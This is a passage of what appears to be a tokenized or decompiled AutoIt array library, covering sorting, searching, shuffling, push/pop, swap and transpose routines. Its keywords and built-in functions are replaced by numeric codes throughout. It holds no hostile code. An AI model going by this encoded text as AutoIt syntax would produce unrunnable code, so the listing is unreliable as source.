9$IREADFROMINDEX=$IINSERT_INDEX
4$IINSERTPOINT_INDEX<=369($VVALUE,$UBOUND_ROWS)5
4225($HDATATYPE)5
$AARRAY[$ICOPYTO_INDEX]=$HDATATYPE($VVALUE[$IINSERTPOINT_INDEX-1])
6
$AARRAY[$ICOPYTO_INDEX]=$VVALUE[$IINSERTPOINT_INDEX-1]
8
6
$AARRAY[$ICOPYTO_INDEX]=""
8
$ICOPYTO_INDEX-=1
$IINSERTPOINT_INDEX-=1
4$IINSERTPOINT_INDEX=05182
$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
10
14
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)
4$ISTART<02$ISTART>$IDIM_2-1534287(6,0,-1)
28$IVALDIM_1,$IVALDIM_2
4219($VVALUE)5
4369($VVALUE,$UBOUND_DIMENSIONS)<>2534287(7,0,-1)
$IVALDIM_1=369($VVALUE,$UBOUND_ROWS)
$IVALDIM_2=369($VVALUE,$UBOUND_COLUMNS)
$HDATATYPE=0
6
$ASPLIT_1=331($VVALUE,$SDELIM_ROW,$STR_NOCOUNT+$STR_ENTIRESPLIT)
$IVALDIM_1=369($ASPLIT_1,$UBOUND_ROWS)
328($ASPLIT_1[0],$SDELIM_ITEM,"")
$IVALDIM_2=@EXTENDED+1
28$ATMP[$IVALDIM_1][$IVALDIM_2]
13$I=015$IVALDIM_1-1
$ASPLIT_2=331($ASPLIT_1[$I],$SDELIM_ITEM,$STR_NOCOUNT+$STR_ENTIRESPLIT)
13$J=015$IVALDIM_2-1
$ATMP[$I][$J]=$ASPLIT_2[$J]
14
14
$VVALUE=$ATMP
8
4369($VVALUE,$UBOUND_COLUMNS)+$ISTART>369($AARRAY,$UBOUND_COLUMNS)534287(8,0,-1)
27$AARRAY[$IDIM_1+$VRANGE[0]+1][$IDIM_2]
13$IREADFROMINDEX=$IDIM_115016-1
13$J=015$IDIM_2-1
$AARRAY[$ICOPYTO_INDEX][$J]=$AARRAY[$IREADFROMINDEX][$J]
14
$ICOPYTO_INDEX-=1
$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
9$IREADFROMINDEX=$IINSERT_INDEX
13$J=015$IDIM_2-1
4$J<$ISTART5
$AARRAY[$ICOPYTO_INDEX][$J]=""
7$J-$ISTART>$IVALDIM_2-15
$AARRAY[$ICOPYTO_INDEX][$J]=""
6
4$IINSERTPOINT_INDEX-1<$IVALDIM_15
4225($HDATATYPE)5
$AARRAY[$ICOPYTO_INDEX][$J]=$HDATATYPE($VVALUE[$IINSERTPOINT_INDEX-1][$J-$ISTART])
6
$AARRAY[$ICOPYTO_INDEX][$J]=$VVALUE[$IINSERTPOINT_INDEX-1][$J-$ISTART]
8
6
$AARRAY[$ICOPYTO_INDEX][$J]=""
8
8
14
$ICOPYTO_INDEX-=1
$IINSERTPOINT_INDEX-=1
4$IINSERTPOINT_INDEX=05182
$IINSERT_INDEX=$VRANGE[$IINSERTPOINT_INDEX]
10
14
216
34287(2,0,-1)
24
34369($AARRAY,$UBOUND_ROWS)
33
32_ARRAYMAX(3036$AARRAY,$ICOMPNUMERIC=0,$ISTART=-1,$IEND=-1,$ISUBITEM=0)
28$IRESULT=_ARRAYMAXINDEX($AARRAY,$ICOMPNUMERIC,$ISTART,$IEND,$ISUBITEM)
4@ERROR534287(@ERROR,0,"")
4369($AARRAY,$UBOUND_DIMENSIONS)=15
34$AARRAY[$IRESULT]
6
34$AARRAY[$IRESULT][$ISUBITEM]
8
33
32_ARRAYMAXINDEX(3036$AARRAY,$ICOMPNUMERIC=0,$ISTART=-1,$IEND=-1,$ISUBITEM=0)
4$ICOMPNUMERIC=415$ICOMPNUMERIC=0
4$ISTART=415$ISTART=-1
4$IEND=415$IEND=-1
4$ISUBITEM=415$ISUBITEM=0
28$IRET=__ARRAY_MINMAXINDEX($AARRAY,$ICOMPNUMERIC,$ISTART,$IEND,$ISUBITEM,__ARRAY_GREATERTHAN)
34287(@ERROR,0,$IRET)
33
32_ARRAYMIN(3036$AARRAY,$ICOMPNUMERIC=0,$ISTART=-1,$IEND=-1,$ISUBITEM=0)
28$IRESULT=_ARRAYMININDEX($AARRAY,$ICOMPNUMERIC,$ISTART,$IEND,$ISUBITEM)
4@ERROR534287(@ERROR,0,"")
4369($AARRAY,$UBOUND_DIMENSIONS)=15
34$AARRAY[$IRESULT]
6
34$AARRAY[$IRESULT][$ISUBITEM]
8
33
32_ARRAYMININDEX(3036$AARRAY,$ICOMPNUMERIC=0,$ISTART=-1,$IEND=-1,$ISUBITEM=0)
4$ICOMPNUMERIC=415$ICOMPNUMERIC=0
4$ISTART=415$ISTART=-1
4$IEND=415$IEND=-1
4$ISUBITEM=415$ISUBITEM=0
28$IRET=__ARRAY_MINMAXINDEX($AARRAY,$ICOMPNUMERIC,$ISTART,$IEND,$ISUBITEM,__ARRAY_LESSTHAN)
34287(@ERROR,0,$IRET)
33
32_ARRAYPERMUTE(36$AARRAY,$SDELIMITER="")
4$SDELIMITER=415$SDELIMITER=""
43219($AARRAY)534287(1,0,0)
4369($AARRAY,$UBOUND_DIMENSIONS)<>1534287(2,0,0)
28$ISIZE=369($AARRAY),$IFACTORIAL=1,$AIDX[$ISIZE],$ARESULT[1],$ICOUNT=1
4369($AARRAY)5
13$I=015$ISIZE-1
$AIDX[$I]=$I
14
13$I=$ISIZE15116-1
$IFACTORIAL*=$I
14
27$ARESULT[$IFACTORIAL+1]
$ARESULT[0]=$IFACTORIAL
__ARRAY_EXETERINTERNAL($AARRAY,0,$ISIZE,$SDELIMITER,$AIDX,$ARESULT,$ICOUNT)
6
$ARESULT[0]=0
8
34$ARESULT
33
32_ARRAYPOP(36$AARRAY)
4(3219($AARRAY))534287(1,0,"")
4369($AARRAY,$UBOUND_DIMENSIONS)<>1534287(2,0,"")
28$IUBOUND=369($AARRAY)-1
4$IUBOUND=-1534287(3,0,"")
28$SLASTVAL=$AARRAY[$IUBOUND]
4$IUBOUND>-15
27$AARRAY[$IUBOUND]
8
34$SLASTVAL
33
32_ARRAYPUSH(36$AARRAY,$VVALUE,$IDIRECTION=0)
4$IDIRECTION=415$IDIRECTION=0
4(3219($AARRAY))534287(1,0,0)
4369($AARRAY,$UBOUND_DIMENSIONS)<>1534287(3,0,0)
28$IUBOUND=369($AARRAY)-1
4219($VVALUE)5
28$IUBOUNDS=369($VVALUE)
4($IUBOUNDS-1)>$IUBOUND534287(2,0,0)
4$IDIRECTION5
13$I=$IUBOUND15$IUBOUNDS16-1
$AARRAY[$I]=$AARRAY[$I-$IUBOUNDS]
14
13$I=015$IUBOUNDS-1
$AARRAY[$I]=$VVALUE[$I]
14
6
13$I=015$IUBOUND-$IUBOUNDS
$AARRAY[$I]=$AARRAY[$I+$IUBOUNDS]
14
13$I=015$IUBOUNDS-1
$AARRAY[$I+$IUBOUND-$IUBOUNDS+1]=$VVALUE[$I]
14
8
6
4$IUBOUND>-15
4$IDIRECTION5
13$I=$IUBOUND15116-1
$AARRAY[$I]=$AARRAY[$I-1]
14
$AARRAY[0]=$VVALUE
6
13$I=015$IUBOUND-1
$AARRAY[$I]=$AARRAY[$I+1]
14
$AARRAY[$IUBOUND]=$VVALUE
8
8
8
341
33
32_ARRAYREVERSE(36$AARRAY,$ISTART=0,$IEND=0)
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
43219($AARRAY)534287(1,0,0)
4369($AARRAY,$UBOUND_DIMENSIONS)<>1534287(3,0,0)
43369($AARRAY)534287(4,0,0)
28$VTMP,$IUBOUND=369($AARRAY)-1
4$IEND<12$IEND>$IUBOUND5$IEND=$IUBOUND
4$ISTART<05$ISTART=0
4$ISTART>$IEND534287(2,0,0)
13$I=$ISTART15217(($ISTART+$IEND-1)/2)
$VTMP=$AARRAY[$I]
$AARRAY[$I]=$AARRAY[$IEND]
$AARRAY[$IEND]=$VTMP
$IEND-=1
14
341
33
32_ARRAYSEARCH(3036$AARRAY,$VVALUE,$ISTART=0,$IEND=0,$ICASE=0,$ICOMPARE=0,$IFORWARD=1,$ISUBITEM=-1,$BROW=40)
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
4$ICASE=415$ICASE=0
4$ICOMPARE=415$ICOMPARE=0
4$IFORWARD=415$IFORWARD=1
4$ISUBITEM=415$ISUBITEM=-1
4$BROW=415$BROW=40
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY)-1
4$IDIM_1=-1534287(3,0,-1)
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
28$BCOMPTYPE=40
4$ICOMPARE=25
$ICOMPARE=0
$BCOMPTYPE=39
8
4$BROW5
4369($AARRAY,$UBOUND_DIMENSIONS)=1534287(5,0,-1)
4$IEND<12$IEND>$IDIM_25$IEND=$IDIM_2
4$ISTART<05$ISTART=0
4$ISTART>$IEND534287(4,0,-1)
6
4$IEND<12$IEND>$IDIM_15$IEND=$IDIM_1
4$ISTART<05$ISTART=0
4$ISTART>$IEND534287(4,0,-1)
8
28$ISTEP=1
43$IFORWARD5
28$ITMP=$ISTART
$ISTART=$IEND
$IEND=$ITMP
$ISTEP=-1
8
23369($AARRAY,$UBOUND_DIMENSIONS)
211
43$ICOMPARE5
43$ICASE5
13$I=$ISTART15$IEND16$ISTEP
4$BCOMPTYPE1377($AARRAY[$I])<>377($VVALUE)519
4$AARRAY[$I]=$VVALUE534$I
14
6
13$I=$ISTART15$IEND16$ISTEP
4$BCOMPTYPE1377($AARRAY[$I])<>377($VVALUE)519
4$AARRAY[$I]==$VVALUE534$I
14
8
6
13$I=$ISTART15$IEND16$ISTEP
4$ICOMPARE=35
4326($AARRAY[$I],$VVALUE)534$I
6
4311($AARRAY[$I],$VVALUE,$ICASE)>0534$I
8
14
8
212
28$IDIM_SUB
4$BROW5
$IDIM_SUB=$IDIM_1
4$ISUBITEM>$IDIM_SUB5$ISUBITEM=$IDIM_SUB
4$ISUBITEM<05
$ISUBITEM=0
6
$IDIM_SUB=$ISUBITEM
8
6
$IDIM_SUB=$IDIM_2
4$ISUBITEM>$IDIM_SUB5$ISUBITEM=$IDIM_SUB
4$ISUBITEM<05
$ISUBITEM=0
6
$IDIM_SUB=$ISUBITEM
8
8
13$J=$ISUBITEM15$IDIM_SUB
43$ICOMPARE5
43$ICASE5
13$I=$ISTART15$IEND16$ISTEP
4$BROW5
4$BCOMPTYPE1377($AARRAY[$J][$I])<>377($VVALUE)519
4$AARRAY[$J][$I]=$VVALUE534$I
6
4$BCOMPTYPE1377($AARRAY[$I][$J])<>377($VVALUE)519
4$AARRAY[$I][$J]=$VVALUE534$I
8
14
6
13$I=$ISTART15$IEND16$ISTEP
4$BROW5
4$BCOMPTYPE1377($AARRAY[$J][$I])<>377($VVALUE)519
4$AARRAY[$J][$I]==$VVALUE534$I
6
4$BCOMPTYPE1377($AARRAY[$I][$J])<>377($VVALUE)519
4$AARRAY[$I][$J]==$VVALUE534$I
8
14
8
6
13$I=$ISTART15$IEND16$ISTEP
4$ICOMPARE=35
4$BROW5
4326($AARRAY[$J][$I],$VVALUE)534$I
6
4326($AARRAY[$I][$J],$VVALUE)534$I
8
6
4$BROW5
4311($AARRAY[$J][$I],$VVALUE,$ICASE)>0534$I
6
4311($AARRAY[$I][$J],$VVALUE,$ICASE)>0534$I
8
8
14
8
14
216
34287(2,0,-1)
24
34287(6,0,-1)
33
32_ARRAYSHUFFLE(36$AARRAY,$ISTART_ROW=0,$IEND_ROW=0,$ICOL=-1)
4$ISTART_ROW=415$ISTART_ROW=0
4$IEND_ROW=415$IEND_ROW=0
4$ICOL=415$ICOL=-1
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)
4$IEND_ROW=05$IEND_ROW=$IDIM_1-1
4$ISTART_ROW<02$ISTART_ROW>$IDIM_1-1534287(3,0,-1)
4$IEND_ROW<12$IEND_ROW>$IDIM_1-1534287(3,0,-1)
4$ISTART_ROW>$IEND_ROW534287(4,0,-1)
28$VTMP,$IRAND
23369($AARRAY,$UBOUND_DIMENSIONS)
211
13$I=$IEND_ROW15$ISTART_ROW+116-1
$IRAND=274($ISTART_ROW,$I,1)
$VTMP=$AARRAY[$I]
$AARRAY[$I]=$AARRAY[$IRAND]
$AARRAY[$IRAND]=$VTMP
14
341
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)
4$ICOL<-12$ICOL>$IDIM_2-1534287(5,0,-1)
28$ICOL_START,$ICOL_END
4$ICOL=-15
$ICOL_START=0
$ICOL_END=$IDIM_2-1
6
$ICOL_START=$ICOL
$ICOL_END=$ICOL
8
13$I=$IEND_ROW15$ISTART_ROW+116-1
$IRAND=274($ISTART_ROW,$I,1)
13$J=$ICOL_START15$ICOL_END
$VTMP=$AARRAY[$I][$J]
$AARRAY[$I][$J]=$AARRAY[$IRAND][$J]
$AARRAY[$IRAND][$J]=$VTMP
14
14
341
216
34287(2,0,-1)
24
33
32_ARRAYSORT(36$AARRAY,$IDESCENDING=0,$ISTART=0,$IEND=0,$ISUBITEM=0,$IPIVOT=0)
4$IDESCENDING=415$IDESCENDING=0
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
4$ISUBITEM=415$ISUBITEM=0
4$IPIVOT=415$IPIVOT=0
43219($AARRAY)534287(1,0,0)
28$IUBOUND=369($AARRAY)-1
4$IUBOUND=-1534287(5,0,0)
4$IEND=415$IEND=0
4$IEND<12$IEND>$IUBOUND2$IEND=415$IEND=$IUBOUND
4$ISTART<02$ISTART=415$ISTART=0
4$ISTART>$IEND534287(2,0,0)
23369($AARRAY,$UBOUND_DIMENSIONS)
211
4$IPIVOT5
__ARRAYDUALPIVOTSORT($AARRAY,$ISTART,$IEND)
6
__ARRAYQUICKSORT1D($AARRAY,$ISTART,$IEND)
8
4$IDESCENDING5_ARRAYREVERSE($AARRAY,$ISTART,$IEND)
212
4$IPIVOT534287(6,0,0)
28$ISUBMAX=369($AARRAY,$UBOUND_COLUMNS)-1
4$ISUBITEM>$ISUBMAX534287(3,0,0)
4$IDESCENDING5
$IDESCENDING=-1
6
$IDESCENDING=1
8
__ARRAYQUICKSORT2D($AARRAY,$IDESCENDING,$ISTART,$IEND,$ISUBITEM,$ISUBMAX)
216
34287(4,0,0)
24
341
33
32__ARRAYQUICKSORT1D(36$AARRAY,3036$ISTART,3036$IEND)
4$IEND<=$ISTART534
28$VTMP
4($IEND-$ISTART)<155
28$VCUR
13$I=$ISTART+115$IEND
$VTMP=$AARRAY[$I]
4230($VTMP)5
13$J=$I-115$ISTART16-1
$VCUR=$AARRAY[$J]
4($VTMP>=$VCUR1230($VCUR))2(3230($VCUR)1308($VTMP,$VCUR)>=0)518
$AARRAY[$J+1]=$VCUR
14
6
13$J=$I-115$ISTART16-1
4(308($VTMP,$AARRAY[$J])>=0)518
$AARRAY[$J+1]=$AARRAY[$J]
14
8
$AARRAY[$J+1]=$VTMP
14
34
8
28$L=$ISTART,$R=$IEND,$VPIVOT=$AARRAY[217(($ISTART+$IEND)/2)],$BNUM=230($VPIVOT)
11
4$BNUM5
9($AARRAY[$L]<$VPIVOT1230($AARRAY[$L]))2(3230($AARRAY[$L])1308($AARRAY[$L],$VPIVOT)<0)
$L+=1
10
9($AARRAY[$R]>$VPIVOT1230($AARRAY[$R]))2(3230($AARRAY[$R])1308($AARRAY[$R],$VPIVOT)>0)
$R-=1
10
6
9(308($AARRAY[$L],$VPIVOT)<0)
$L+=1
10
9(308($AARRAY[$R],$VPIVOT)>0)
$R-=1
10
8
4$L<=$R5
$VTMP=$AARRAY[$L]
$AARRAY[$L]=$AARRAY[$R]
$AARRAY[$R]=$VTMP
$L+=1
$R-=1
8
12$L>$R
__ARRAYQUICKSORT1D($AARRAY,$ISTART,$R)
__ARRAYQUICKSORT1D($AARRAY,$L,$IEND)
33
32__ARRAYQUICKSORT2D(36$AARRAY,3036$ISTEP,3036$ISTART,3036$IEND,3036$ISUBITEM,3036$ISUBMAX)
4$IEND<=$ISTART534
28$VTMP,$L=$ISTART,$R=$IEND,$VPIVOT=$AARRAY[217(($ISTART+$IEND)/2)][$ISUBITEM],$BNUM=230($VPIVOT)
11
4$BNUM5
9($ISTEP*($AARRAY[$L][$ISUBITEM]-$VPIVOT)<01230($AARRAY[$L][$ISUBITEM]))2(3230($AARRAY[$L][$ISUBITEM])1$ISTEP*308($AARRAY[$L][$ISUBITEM],$VPIVOT)<0)
$L+=1
10
9($ISTEP*($AARRAY[$R][$ISUBITEM]-$VPIVOT)>01230($AARRAY[$R][$ISUBITEM]))2(3230($AARRAY[$R][$ISUBITEM])1$ISTEP*308($AARRAY[$R][$ISUBITEM],$VPIVOT)>0)
$R-=1
10
6
9($ISTEP*308($AARRAY[$L][$ISUBITEM],$VPIVOT)<0)
$L+=1
10
9($ISTEP*308($AARRAY[$R][$ISUBITEM],$VPIVOT)>0)
$R-=1
10
8
4$L<=$R5
13$I=015$ISUBMAX
$VTMP=$AARRAY[$L][$I]
$AARRAY[$L][$I]=$AARRAY[$R][$I]
$AARRAY[$R][$I]=$VTMP
14
$L+=1
$R-=1
8
12$L>$R
__ARRAYQUICKSORT2D($AARRAY,$ISTEP,$ISTART,$R,$ISUBITEM,$ISUBMAX)
__ARRAYQUICKSORT2D($AARRAY,$ISTEP,$L,$IEND,$ISUBITEM,$ISUBMAX)
33
32__ARRAYDUALPIVOTSORT(36$AARRAY,$IPIVOT_LEFT,$IPIVOT_RIGHT,$BLEFTMOST=39)
4$IPIVOT_LEFT>$IPIVOT_RIGHT534
28$ILENGTH=$IPIVOT_RIGHT-$IPIVOT_LEFT+1
28$I,$J,$K,$IAI,$IAK,$IA1,$IA2,$ILAST
4$ILENGTH<455
4$BLEFTMOST5
$I=$IPIVOT_LEFT
9$I<$IPIVOT_RIGHT
$J=$I
$IAI=$AARRAY[$I+1]
9$IAI<$AARRAY[$J]
$AARRAY[$J+1]=$AARRAY[$J]
$J-=1
4$J+1=$IPIVOT_LEFT518
10
$AARRAY[$J+1]=$IAI
$I+=1
10
6
91
4$IPIVOT_LEFT>=$IPIVOT_RIGHT5341
$IPIVOT_LEFT+=1
4$AARRAY[$IPIVOT_LEFT]<$AARRAY[$IPIVOT_LEFT-1]518
10
91
$K=$IPIVOT_LEFT
$IPIVOT_LEFT+=1
4$IPIVOT_LEFT>$IPIVOT_RIGHT518
$IA1=$AARRAY[$K]
$IA2=$AARRAY[$IPIVOT_LEFT]
4$IA1<$IA25
$IA2=$IA1
$IA1=$AARRAY[$IPIVOT_LEFT]
8
$K-=1
9$IA1<$AARRAY[$K]
$AARRAY[$K+2]=$AARRAY[$K]
$K-=1
10
$AARRAY[$K+2]=$IA1
9$IA2<$AARRAY[$K]
$AARRAY[$K+1]=$AARRAY[$K]
$K-=1
10
$AARRAY[$K+1]=$IA2
$IPIVOT_LEFT+=1
10
$ILAST=$AARRAY[$IPIVOT_RIGHT]
$IPIVOT_RIGHT-=1
9$ILAST<$AARRAY[$IPIVOT_RIGHT]
$AARRAY[$IPIVOT_RIGHT+1]=$AARRAY[$IPIVOT_RIGHT]
$IPIVOT_RIGHT-=1
10
$AARRAY[$IPIVOT_RIGHT+1]=$ILAST
8
341
8
28$ISEVENTH=21($ILENGTH,3)+21($ILENGTH,6)+1
28$IE1,$IE2,$IE3,$IE4,$IE5,$T
$IE3=27(($IPIVOT_LEFT+$IPIVOT_RIGHT)/2)
$IE2=$IE3-$ISEVENTH
$IE1=$IE2-$ISEVENTH
$IE4=$IE3+$ISEVENTH
$IE5=$IE4+$ISEVENTH
4$AARRAY[$IE2]<$AARRAY[$IE1]5
$T=$AARRAY[$IE2]
$AARRAY[$IE2]=$AARRAY[$IE1]
$AARRAY[$IE1]=$T
8
4$AARRAY[$IE3]<$AARRAY[$IE2]5
$T=$AARRAY[$IE3]
$AARRAY[$IE3]=$AARRAY[$IE2]
$AARRAY[$IE2]=$T
4$T<$AARRAY[$IE1]5
$AARRAY[$IE2]=$AARRAY[$IE1]
$AARRAY[$IE1]=$T
8
8
4$AARRAY[$IE4]<$AARRAY[$IE3]5
$T=$AARRAY[$IE4]
$AARRAY[$IE4]=$AARRAY[$IE3]
$AARRAY[$IE3]=$T
4$T<$AARRAY[$IE2]5
$AARRAY[$IE3]=$AARRAY[$IE2]
$AARRAY[$IE2]=$T
4$T<$AARRAY[$IE1]5
$AARRAY[$IE2]=$AARRAY[$IE1]
$AARRAY[$IE1]=$T
8
8
8
4$AARRAY[$IE5]<$AARRAY[$IE4]5
$T=$AARRAY[$IE5]
$AARRAY[$IE5]=$AARRAY[$IE4]
$AARRAY[$IE4]=$T
4$T<$AARRAY[$IE3]5
$AARRAY[$IE4]=$AARRAY[$IE3]
$AARRAY[$IE3]=$T
4$T<$AARRAY[$IE2]5
$AARRAY[$IE3]=$AARRAY[$IE2]
$AARRAY[$IE2]=$T
4$T<$AARRAY[$IE1]5
$AARRAY[$IE2]=$AARRAY[$IE1]
$AARRAY[$IE1]=$T
8
8
8
8
28$ILESS=$IPIVOT_LEFT
28$IGREATER=$IPIVOT_RIGHT
4(($AARRAY[$IE1]<>$AARRAY[$IE2])1($AARRAY[$IE2]<>$AARRAY[$IE3])1($AARRAY[$IE3]<>$AARRAY[$IE4])1($AARRAY[$IE4]<>$AARRAY[$IE5]))5
28$IPIVOT_1=$AARRAY[$IE2]
28$IPIVOT_2=$AARRAY[$IE4]
$AARRAY[$IE2]=$AARRAY[$IPIVOT_LEFT]
$AARRAY[$IE4]=$AARRAY[$IPIVOT_RIGHT]
11
$ILESS+=1
12$AARRAY[$ILESS]>=$IPIVOT_1
11
$IGREATER-=1
12$AARRAY[$IGREATER]<=$IPIVOT_2
$K=$ILESS
9$K<=$IGREATER
$IAK=$AARRAY[$K]
4$IAK<$IPIVOT_15
$AARRAY[$K]=$AARRAY[$ILESS]
$AARRAY[$ILESS]=$IAK
$ILESS+=1
7$IAK>$IPIVOT_25
9$AARRAY[$IGREATER]>$IPIVOT_2
$IGREATER-=1
4$IGREATER+1=$K5182
10
4$AARRAY[$IGREATER]<$IPIVOT_15
$AARRAY[$K]=$AARRAY[$ILESS]
$AARRAY[$ILESS]=$AARRAY[$IGREATER]
$ILESS+=1
6
$AARRAY[$K]=$AARRAY[$IGREATER]
8
$AARRAY[$IGREATER]=$IAK
$IGREATER-=1
8
$K+=1
10
$AARRAY[$IPIVOT_LEFT]=$AARRAY[$ILESS-1]
$AARRAY[$ILESS-1]=$IPIVOT_1
$AARRAY[$IPIVOT_RIGHT]=$AARRAY[$IGREATER+1]
$AARRAY[$IGREATER+1]=$IPIVOT_2
__ARRAYDUALPIVOTSORT($AARRAY,$IPIVOT_LEFT,$ILESS-2,39)
__ARRAYDUALPIVOTSORT($AARRAY,$IGREATER+2,$IPIVOT_RIGHT,40)
4($ILESS<$IE1)1($IE5<$IGREATER)5
9$AARRAY[$ILESS]=$IPIVOT_1
$ILESS+=1
10
9$AARRAY[$IGREATER]=$IPIVOT_2
$IGREATER-=1
10
$K=$ILESS
9$K<=$IGREATER
$IAK=$AARRAY[$K]
4$IAK=$IPIVOT_15
$AARRAY[$K]=$AARRAY[$ILESS]
$AARRAY[$ILESS]=$IAK
$ILESS+=1
7$IAK=$IPIVOT_25
9$AARRAY[$IGREATER]=$IPIVOT_2
$IGREATER-=1
4$IGREATER+1=$K5182
10
4$AARRAY[$IGREATER]=$IPIVOT_15
$AARRAY[$K]=$AARRAY[$ILESS]
$AARRAY[$ILESS]=$IPIVOT_1
$ILESS+=1
6
$AARRAY[$K]=$AARRAY[$IGREATER]
8
$AARRAY[$IGREATER]=$IAK
$IGREATER-=1
8
$K+=1
10
8
__ARRAYDUALPIVOTSORT($AARRAY,$ILESS,$IGREATER,40)
6
28$IPIVOT=$AARRAY[$IE3]
$K=$ILESS
9$K<=$IGREATER
4$AARRAY[$K]=$IPIVOT5
$K+=1
19
8
$IAK=$AARRAY[$K]
4$IAK<$IPIVOT5
$AARRAY[$K]=$AARRAY[$ILESS]
$AARRAY[$ILESS]=$IAK
$ILESS+=1
6
9$AARRAY[$IGREATER]>$IPIVOT
$IGREATER-=1
10
4$AARRAY[$IGREATER]<$IPIVOT5
$AARRAY[$K]=$AARRAY[$ILESS]
$AARRAY[$ILESS]=$AARRAY[$IGREATER]
$ILESS+=1
6
$AARRAY[$K]=$IPIVOT
8
$AARRAY[$IGREATER]=$IAK
$IGREATER-=1
8
$K+=1
10
__ARRAYDUALPIVOTSORT($AARRAY,$IPIVOT_LEFT,$ILESS-1,39)
__ARRAYDUALPIVOTSORT($AARRAY,$IGREATER+1,$IPIVOT_RIGHT,40)
8
33
32_ARRAYSWAP(36$AARRAY,$IINDEX_1,$IINDEX_2,$BCOL=40,$ISTART=-1,$IEND=-1)
4$BCOL=415$BCOL=40
4$ISTART=415$ISTART=-1
4$IEND=415$IEND=-1
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
4$IDIM_2=-15
$BCOL=40
$ISTART=-1
$IEND=-1
8
4$ISTART>$IEND534287(5,0,-1)
4$BCOL5
4$IINDEX_1<02$IINDEX_2>$IDIM_2534287(3,0,-1)
4$ISTART=-15$ISTART=0
4$IEND=-15$IEND=$IDIM_1
6
4$IINDEX_1<02$IINDEX_2>$IDIM_1534287(3,0,-1)
4$ISTART=-15$ISTART=0
4$IEND=-15$IEND=$IDIM_2
8
28$VTMP
23369($AARRAY,$UBOUND_DIMENSIONS)
211
$VTMP=$AARRAY[$IINDEX_1]
$AARRAY[$IINDEX_1]=$AARRAY[$IINDEX_2]
$AARRAY[$IINDEX_2]=$VTMP
212
4$ISTART<-12$IEND<-1534287(4,0,-1)
4$BCOL5
4$ISTART>$IDIM_12$IEND>$IDIM_1534287(4,0,-1)
13$J=$ISTART15$IEND
$VTMP=$AARRAY[$J][$IINDEX_1]
$AARRAY[$J][$IINDEX_1]=$AARRAY[$J][$IINDEX_2]
$AARRAY[$J][$IINDEX_2]=$VTMP
14
6
4$ISTART>$IDIM_22$IEND>$IDIM_2534287(4,0,-1)
13$J=$ISTART15$IEND
$VTMP=$AARRAY[$IINDEX_1][$J]
$AARRAY[$IINDEX_1][$J]=$AARRAY[$IINDEX_2][$J]
$AARRAY[$IINDEX_2][$J]=$VTMP
14
8
216
34287(2,0,-1)
24
341
33
32_ARRAYTOCLIP(3036$AARRAY,$SDELIM_COL="|",$ISTART_ROW=-1,$IEND_ROW=-1,$SDELIM_ROW=@CRLF,$ISTART_COL=-1,$IEND_COL=-1)
28$SRESULT=_ARRAYTOSTRING($AARRAY,$SDELIM_COL,$ISTART_ROW,$IEND_ROW,$SDELIM_ROW,$ISTART_COL,$IEND_COL)
4@ERROR534287(@ERROR,0,0)
431($SRESULT)5341
34287(-1,0,0)
33
32_ARRAYTOSTRING(3036$AARRAY,$SDELIM_COL="|",$ISTART_ROW=-1,$IEND_ROW=-1,$SDELIM_ROW=@CRLF,$ISTART_COL=-1,$IEND_COL=-1)
4$SDELIM_COL=415$SDELIM_COL="|"
4$SDELIM_ROW=415$SDELIM_ROW=@CRLF
4$ISTART_ROW=415$ISTART_ROW=-1
4$IEND_ROW=415$IEND_ROW=-1
4$ISTART_COL=415$ISTART_COL=-1
4$IEND_COL=415$IEND_COL=-1
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
4$ISTART_ROW=-15$ISTART_ROW=0
4$IEND_ROW=-15$IEND_ROW=$IDIM_1
4$ISTART_ROW<-12$IEND_ROW<-1534287(3,0,-1)
4$ISTART_ROW>$IDIM_12$IEND_ROW>$IDIM_1534287(3,0,"")
4$ISTART_ROW>$IEND_ROW534287(4,0,-1)
28$SRET=""
23369($AARRAY,$UBOUND_DIMENSIONS)
211
13$I=$ISTART_ROW15$IEND_ROW
$SRET&=$AARRAY[$I]&$SDELIM_COL
14
34337($SRET,323($SDELIM_COL))
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
4$ISTART_COL=-15$ISTART_COL=0
4$IEND_COL=-15$IEND_COL=$IDIM_2
4$ISTART_COL<-12$IEND_COL<-1534287(5,0,-1)
4$ISTART_COL>$IDIM_22$IEND_COL>$IDIM_2534287(5,0,-1)
4$ISTART_COL>$IEND_COL534287(6,0,-1)
13$I=$ISTART_ROW15$IEND_ROW
13$J=$ISTART_COL15$IEND_COL
$SRET&=$AARRAY[$I][$J]&$SDELIM_COL
14
$SRET=337($SRET,323($SDELIM_COL))&$SDELIM_ROW
14
34337($SRET,323($SDELIM_ROW))
216
34287(2,0,-1)
24
341
33
32_ARRAYTRANSPOSE(36$AARRAY)
23369($AARRAY,0)
210
34287(2,0,0)
211
28$ATEMP[1][369($AARRAY)]
13$I=015369($AARRAY)-1
$ATEMP[0][$I]=$AARRAY[$I]
14
$AARRAY=$ATEMP
212
28$IDIM_1=369($AARRAY,1),$IDIM_2=369($AARRAY,2)
4$IDIM_1<>$IDIM_25
28$ATEMP[$IDIM_2][$IDIM_1]
13$I=015$IDIM_1-1
13$J=015$IDIM_2-1
$ATEMP[$J][$I]=$AARRAY[$I][$J]
14
14
$AARRAY=$ATEMP
6
28$VELEMENT
13$I=015$IDIM_1-1
13$J=$I+115$IDIM_2-1
$VELEMENT=$AARRAY[$I][$J]
$AARRAY[$I][$J]=$AARRAY[$J][$I]
$AARRAY[$J][$I]=$VELEMENT
14
14
8
216
34287(1,0,0)
24
341
33
32_ARRAYTRIM(36$AARRAY,$ITRIMNUM,$IDIRECTION=0,$ISTART=0,$IEND=0,$ISUBITEM=0)
4$IDIRECTION=415$IDIRECTION=0
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
